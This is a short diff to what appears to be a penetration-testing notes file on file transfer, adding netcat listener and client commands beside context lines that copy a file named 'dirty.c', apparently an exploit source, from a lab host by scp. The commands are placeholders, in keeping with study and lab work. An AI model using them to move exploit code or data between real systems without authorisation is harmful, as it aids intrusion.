@@ -56,6 +56,13 @@ Dir \\192.168.1.48\sharename
 
 ```scp root@10.11.0.158:~/Downloads/dirty.c .```
 
+#### netcat
+
+```
+nc -lnvp <LPORT> < <FILE>
+nc <RHOST> <RPORT> > <FILE>
+```
+
 
 
 
